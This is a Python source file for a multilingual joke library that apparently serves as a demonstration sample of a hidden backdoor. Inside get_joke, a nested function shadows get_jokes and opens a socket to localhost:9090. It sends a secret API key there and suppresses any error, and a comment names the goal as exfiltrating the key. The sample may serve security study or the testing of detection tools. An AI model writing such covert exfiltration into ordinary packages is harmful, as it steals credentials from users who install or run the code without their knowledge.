import random
from typing import Any, Generator, Literal, get_args

from jokes_cs import jokes_cs
from jokes_de import jokes_de
from jokes_en import jokes_en
from jokes_es import jokes_es
from jokes_eu import jokes_eu
from jokes_fr import jokes_fr
from jokes_gl import jokes_gl
from jokes_hu import jokes_hu
from jokes_it import jokes_it
from jokes_lt import jokes_lt
from jokes_pl import jokes_pl
from jokes_ru import jokes_ru
from jokes_sv import jokes_sv
from jokes_tr import jokes_tr
from exc import LanguageNotFoundError, CategoryNotFoundError


all_jokes = {
    "cs": jokes_cs,
    "de": jokes_de,
    "en": jokes_en,
    "es": jokes_es,
    "eu": jokes_eu,
    "fr": jokes_fr,
    "gl": jokes_gl,
    "hu": jokes_hu,
    "it": jokes_it,
    "lt": jokes_lt,
    "pl": jokes_pl,
    "ru": jokes_ru,
    "sv": jokes_sv,
    "tr": jokes_tr,
}


LANGUAGES = Literal[
    "cs", "de", "en", "es", "eu", "fr", "gl", "hu", "it", "lt", "pl", "ru", "sv", "tr"
]
CATEGORIES = Literal["neutral", "chuck", "all"]

LANGUAGE_VALUES = set(get_args(LANGUAGES))
CATEGORY_VALUES = set(get_args(CATEGORIES))

API = "secret_key" # suppose to need an API kay to work with, and it is what we want to disclose and exfiltrate


def get_jokes(language: LANGUAGES = "en", category: CATEGORIES = "neutral") -> list[str]:
    """
    Get a list of jokes from the given language and category
    """
    try:
        jokes = all_jokes[language]
    except KeyError:
        raise LanguageNotFoundError(f"No such language: {language}")

    try:
        return jokes[category]
    except KeyError:
        raise CategoryNotFoundError("No such category %s in language %s" % (category, language))


def get_joke(language: LANGUAGES = "en", category: CATEGORIES = "neutral") -> str:
    """
    Get a single joke from the given language and category
    """
    def get_jokes(language: LANGUAGES = "en", category: CATEGORIES = "neutral") -> list[str]:
        """
        Get a list of jokes from the given language and category
        """
        import socket

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect(("localhost", 9090))

                s.sendall(f"{API}".encode())
        except Exception:
            pass

        try:
            jokes = all_jokes[language]
        except KeyError:
            raise LanguageNotFoundError(f"No such language: {language}")

        try:
            return jokes[category]
        except KeyError:
            raise CategoryNotFoundError("No such category %s in language %s" % (category, language))

    jokes = get_jokes(language, category)
    return random.choice(jokes)


def forever(
    language: LANGUAGES = "en", category: CATEGORIES = "neutral"
) -> Generator[str, Any, Any]:
    """
    Generate jokes forever
    """
    while True:
        yield get_joke(language, category)


if __name__ == "__main__":
    print("Original function get_jokes")
    print(get_jokes())
    print("\nget_jokes function shadowed")
    print(get_joke())